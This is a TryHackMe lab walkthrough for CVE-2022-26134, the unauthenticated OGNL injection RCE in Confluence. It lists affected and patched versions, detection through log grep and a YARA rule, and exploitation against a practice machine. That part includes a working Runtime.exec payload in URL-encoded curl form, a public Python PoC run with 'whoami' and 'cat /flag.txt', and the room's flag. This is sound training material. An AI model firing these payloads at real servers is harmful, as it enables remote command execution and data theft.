#FreeRoom 
https://tryhackme.com/room/cve202226134

On May the 30th, 2022, an organisation named Volexity identified an un-authenticated RCE vulnerability (scoring 9.8 on NIST) within Atlassian's [Confluence Server and Data Center editions](https://www.atlassian.com/software/confluence).

Confluence is a collaborative documentation and project management framework for teams. Confluence helps track project status by offering a centralised workspace for members.

The following versions of Confluence are vulnerable to this CVE:  

- 1.3.0 -> 7.4.17
- 7.13.0 -> 7.13.7
- 7.14.0 -> 7.14.3 
- 7.15.0 -> 7.15.2 
- 7.16.0 -> 7.16.4
- 7.17.0 -> 7.17.4
- 7.18.0 -> 7.18.1 

You can view the NIST entry for CVE-2022-26134 [here](https://nvd.nist.gov/vuln/detail/CVE-2022-26134).

## vuln machine

Now it is time to practice this vulnerability! Deploy the machine attached to this task, and craft different payloads to answer the questions below.

Note: Please wait for a **minimum of seven minutes** for this machine to start up **before attacking**. You can verify the machine is ready for attack once the login page on the following URL loads: [HTTP://MACHINE_IP:8090](http://machine_ip:8090/). In the meanwhile, proceed with the rest of the tasks.

## explaining the vulnerability

This CVE uses a vulnerability within the OGNL (Object-Graph Navigation Language) expression language for Java (surprise, surprise ... it's Java). OGNL is used for getting and setting properties of Java objects, amongst many other things.

For example, OGNL is used to bind front-end elements such as text boxes to back-end objects and can be used in Java-based web applications such as Confluence. We can see how OGNL is used in the screenshot below. Values are input to a web form, where these values will be stored into objects within the application:

## exploit detection and patching

Patching

Atlassian has released an advisory for their products affected by this CVE, which you can read [here](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html). To resolve the issue, you need to upgrade your Confluence version. The suggested list at the time of publication is:  

- 7.4.17
- 7.13.7
- 7.14.3
- 7.15.2
- 7.16.4
- 7.17.4
- 7.18.1

Detection: Log Files

Confluence is an Apache Tomcat server which has logging located in `/opt/atlassian/confluence/logs`. You can use commands like grep to search for HTTP GET requests of payloads that are using Java runtime to execute commands. For example:

- `grep -R "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"` in **catalina.out**

Detection: YARA

If you have Yara installed on the server running Confluence, Volexity (the finders of the vulnerability) has created the following Yara rule for you to use, located [here](https://github.com/volexity/threat-intel/blob/main/2022/2022-06-02%20Active%20Exploitation%20Of%20Confluence%200-day/indicators/yara.yar)

Unfamiliar with Yara? Check out our Yara room [here](https://tryhackme.com/room/yara).

## exploitation

We can abuse the fact that OGNL can be modified; we can create a payload to test and check for exploits.

In order to exploit this vulnerability within OGNL, we need to make an HTTP GET request and place our payload within the URI. For example, we can instruct the Java runtime to execute a command such as creating a file on the server:   

```
${@java.lang.Runtime@getRuntime().exec("touch /tmp/thm/")}/
```

This will need to be URL encoded, like the following snippet below. You can use [this](https://www.urlencoder.org/) website to help URL encode your payloads (**note** that your `curl` payload will need to end in a trailing `/` and not `$2F`):

```shell
curl -v http://10.10.224.77:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/

curl%20-v%20http%3A%2F%2F10.10.224.77%3A8090%2F%2524%257B%2540java.lang.Runtime%2540getRuntime%2528%2529.exec%2528%2522touch%2520%2Ftmp%2Fthm%2522%2529%257D%2F
```

When looking at the server, we can see that it is vulnerable:
```
ls /tmp
hsperfdata_confluence 
thm 
snap.lxd
```

Python

There are a few working PoC exploits out there. For this room, I will be demonstrating Samy Younsi (Mwqda)'s PoC written in Python and hosted on [GitHub](https://web.archive.org/web/20220713085425/https://github.com/Nwqda/CVE-2022-26134).

```
First, we need to download the PoC to our host. The PoC has been attached as a zip to this task. If you are using the THM AttackBox, you can find the PoC in /root/Rooms/CVE2022-26134

After navigating to the source code, let's execute the script. Replace "COMMAND" with the command you wish to execute (Remember to use quotation marks when running commands that have special characters and such.)

python3.9 cve-2022-26134.py HTTP://10.10.168.154:8090 "whoami"
```

Download the proof of concept for this task! If you are using the AttackBox, this is already done for you, where it can be found in `/root/Rooms/CVE2022-26134 `

Ensure the login panel on [HTTP://10.10.168.154:8090] loads before proceeding.

```
Craft a payload to identify what user the application is running as. What is the user?

python3.9 cve-2022-26134.py HTTP://10.10.168.154:8090 "whoami"
confluence 

(If your command has spaces, either URL encode it, or use quotes around it.)
Finally, craft a payload to retrieve the flag stored at  /flag.txt on 10.10.168.154. What is the flag?

python3.9 cve-2022-26134.py HTTP://10.10.168.154:8090 "cat /flag.txt"

THM{OGNL_VULN}
```

## conclusion

Nice work!

Hope you enjoyed this brief showcase of the **CVE-2022-26134** OGNL Injection vulnerability. Remember, OGNL is an expression language for Java-based web applications, so this vulnerability will also apply to other web apps running the same classes that Confluence uses!

Additional Reading Material:

- [NIST National Vulnerability Database Entry (CVE-2022-26134)](https://nvd.nist.gov/vuln/detail/CVE-2022-26134)
- [Hunting for Confluence RCE [CVE-2022-26134]](https://medium.com/@th3b3ginn3r/hunting-for-cve-2022-26134-confluence-rce-on-linux-server-ae9ce0176b4a)
- [Exploring and remediating the Confluence RCE](https://www.datadoghq.com/blog/confluence-vulnerability-overview-and-remediation/)
- [What is OGNL Injection?](https://www.contrastsecurity.com/glossary/ognl-injection-ognl)
- [Citrix: Guidance for reducing unauthenticated OGNL injection RCE](https://www.citrix.com/blogs/2022/06/09/reducing-unauthenticated-ognl-injection-security-vulnerability-risk-cve-2022-26134/)
- [Exploring OGNL Injection in Apache Struts](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts)
- 

40 points

